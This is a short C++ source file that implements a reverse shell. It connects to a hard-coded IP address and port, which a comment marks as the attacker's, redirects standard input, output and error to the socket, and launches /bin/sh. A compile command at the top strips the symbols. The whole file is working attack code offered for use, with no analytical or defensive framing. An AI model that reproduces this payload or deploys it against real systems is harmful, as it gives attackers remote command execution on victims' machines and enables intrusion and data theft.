// Compile with g++ -o reverse -s reverse.cpp

#include <iostream> // Standard I/O
#include <string>   // std::string
#include <unistd.h> // POSIX OS API
#include <arpa/inet.h> // Internet Operations (IP)
#include <sys/types.h> // Sockets

#define PORT 12345
#define SERVER_IP "192.168.153.128"  // Change to the attacker's IP address

int main() {
	int sock;
	struct sockaddr_in server;

	// Create a socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		std::cerr << "Could not create socket\n";
		return 1;

	}

	server.sin_family = AF_INET; // Use IPV4
	server.sin_port = htons(PORT); // Convert port to network byte order
	server.sin_addr.s_addr = inet_addr(SERVER_IP); // Convert IP addresss to binary format

	// Connect to the attacker
	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
		std::cerr << "Connection failed\n";
		return 1;
	}

	// Redirect standard input, output, and error to socket
	dup2(sock, 0); // STDIN
	dup2(sock, 1); // STDOUT
	dup2(sock, 2); // STDERR

	// Execute a shell
	execve("/bin/sh", NULL, NULL);

	close(sock);
	return 0;
}
